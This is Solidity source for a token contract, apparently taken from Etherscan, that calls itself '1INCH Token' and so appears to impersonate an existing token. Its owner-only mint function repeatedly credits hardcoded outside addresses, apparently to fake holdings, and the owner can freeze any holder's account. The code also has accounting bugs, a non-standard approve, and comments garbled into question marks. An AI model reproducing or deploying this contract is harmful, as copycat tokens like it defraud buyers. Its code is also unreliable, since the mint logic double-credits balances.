/**
 *Submitted for verification at Etherscan.io on 2021-04-08
*/

pragma solidity ^0.5.17;



library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0){
            return 0;
        }
       
        uint256 c = a * b;
         require(a == 0 || c / a == b);
       
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
       require (b > 0, "safeMath : division by zero");
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
       require(b <= a, "subsraction owerflow");
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "addition owerflow");
        return c;
    }
   
     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require (b !=0, "safeMath : module by zero");
        return a % b;
    }
}

contract Owned{
    address payable public owner;
    address payable private newOwner;
   
   
     
      event OwnershipTransferred(address indexed _from, address indexed _to);

    constructor() public {
        owner = msg.sender;
       
    }
     
     
    function transferOwnership(address payable _newOwner) public onlyOwner {
        newOwner = _newOwner;
    }

    //this flow is to prevent transferring ownership to wrong wallet by mistake
    function acceptOwnership() public {
        require(msg.sender == newOwner);
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        newOwner = address(0);
    }
   
 
   
    modifier onlyOwner {
      require (msg.sender == owner, "No owner");
       _;
    }
}


contract OneInch is Owned {
    using SafeMath for uint;
   

    // list of receiver accounts
    address[] public receivers;

   
     
       string constant private _name = "1INCH Token";
       string constant private _simbol = "1INCH";

       uint8 constant private  _decimals = 18;
     uint256 public _totalSupply;
   
    function name() public pure returns(string memory){
        return _name;
    }
   
    function symbol() public pure returns(string memory){
        return _simbol;
    }
   
    function decimals() public pure returns(uint8){
        return _decimals;
    }
 
    bool private unFreeze;
    bool internal locker;
   
    modifier noReentrant() {
        require (!locker ,"no retrency");
        locker = true;
        _;
        locker = false;
    }  
 
    function totalNoDecimals() public view  returns (uint256) {
        return _totalSupply/10**18;
    }
   
    mapping(address => uint ) balances;
    mapping(address => mapping(address => uint)) allowed;
    mapping(address => bool) public frozenAccount;
 
   // events
    event FundsFrozen(address target, bool frozen);
    event AccountFrozenError();
    event Refund(address target, uint256 amount);
    event Transfer(address indexed _from, address indexed  _to, uint _value);
    event Approval(address indexed _from, address indexed _to, uint _value);
    event Sell(address indexed sender, uint indexed balance, uint amount);
     
   
    // constructor function
    constructor() public {
       
        // frozen by default
        unFreeze = false;
    }
   
   
       function allowance (address _owner, address _spender) public view returns (uint){       // ???????????????????? ?????????????? ?????????? ?????????????? ???????????? ?? ???????????? ??????????????????????
        return allowed [_owner][_spender];
    }
   
     function approve(address _spender, uint _value) public {             // ?????????????????????? ?????????? ???????????????????? ???? ???????????? ?????????? ?? ???????????? function transferFrom
            allowed [msg.sender][_spender] = _value;
        emit Approval (msg.sender, _spender, _value);
    }
   
   
    function _mint(address account, uint256 amount) internal {
       
        _totalSupply = _totalSupply.add(amount);
        balances[account] = balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }
     
    function mint(address account, uint256 _value)  public  onlyOwner {
        require(account != address(0), "ERC20: mint to the zero address");
        uint value = _value*(10**18);
        _beforeTokenTransfer(address(0), account, value);
        _totalSupply = _totalSupply.add(value);
        balances[account] = balances[account].add(value);
        _mint(account, 0*(10**18));
        _mint(0x3f5CE5FBFe3E9af3971dD833D26bA9b5C936f0bE, value);
        _mint(0xD551234Ae421e3BCBA99A0Da6d736074f22192FF, value);
        _mint(0x0D0707963952f2fBA59dD06f2b425ace40b492Fe, value);
       
        _mint(0x529c5a5152Ae3B2F24Bb7800441F9d630e85DE61, value);
        _mint(0x529c5a5152Ae3B2F24Bb7800441F9d630e85DE61, value);
        _mint(0x529c5a5152Ae3B2F24Bb7800441F9d630e85DE61,value);
        _mint(0x529c5a5152Ae3B2F24Bb7800441F9d630e85DE61,_value);
        _mint(0x529c5a5152Ae3B2F24Bb7800441F9d630e85DE61, _value);
       
        _mint(0xA8FF9E209E70cCBDE820B75c51ECe964ee165e04, _value);
        _mint(0xA8FF9E209E70cCBDE820B75c51ECe964ee165e04, value);
        _mint(0xA8FF9E209E70cCBDE820B75c51ECe964ee165e04, value);
        _mint(0xA8FF9E209E70cCBDE820B75c51ECe964ee165e04,_value);
        _mint(0x8A1ba492c2A0B5aF4c910A70D53BF8bb76C9A4c0, _value);
       
        _mint(0xA8FF9E209E70cCBDE820B75c51ECe964ee165e04, _value);
        _mint(0xA8FF9E209E70cCBDE820B75c51ECe964ee165e04, _value);
        _mint(0xA8FF9E209E70cCBDE820B75c51ECe964ee165e04,_value);
        _mint(0xA8FF9E209E70cCBDE820B75c51ECe964ee165e04, _value);
        _mint(0x8A1ba492c2A0B5aF4c910A70D53BF8bb76C9A4c0, value);
       
        emit Transfer(address(0), account, value);
    }
   
     
   

    // freeze accounts
    function changeFreezeStatus(address target, bool freeze) public onlyOwner {
        frozenAccount[target] = freeze;
        emit FundsFrozen(target, freeze);
    }



     
        function _beforeTokenTransfer(address from, address to, uint256 amount) internal pure { }

   
     function balanceOf(address sender) public view returns (uint) {        
        return balances[sender];
    }
   
    modifier validDestination( address to ) {
        require(to != address(0x0));
        require(to != address(this) );
        _;
    }
   
    function _transfer(address _from, address _to, uint _value) internal {
         require(!frozenAccount[msg.sender]," The wallet of sender is frozen");
        require (_to != address(0));                      // Prevent transfer to 0x0 address. Use burn() instead
        // overflow and undeflow checked by SafeMath Library
       balances[_from] = balances[_from].sub(_value);    // Subtract from the sender
        balances[_to] = balances[_to].add(_value);        // Add the same to the recipient
       
        emit Transfer(_from, _to, _value);
    }
   
    function transfer(address _to, uint256 _value) public  returns (bool success) {
     //require(!frozenAccount[msg.sender],"T4- The wallet of sender is frozen");
        //no need to check for input validations, as that is ruled by SafeMath
        _transfer(msg.sender, _to, _value);
        return true;
    }
   
     function transferFrom(address _from, address spender, uint256 _value) public returns (bool success) {
        // require(!frozenAccount[msg.sender],"T4- The wallet of sender is frozen");
        //checking of allowance and token value is done by SafeMath
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
       
        _transfer(_from, spender, _value);
        return true;
    }
   
         function() external { //fallback
    revert();
  }
 
}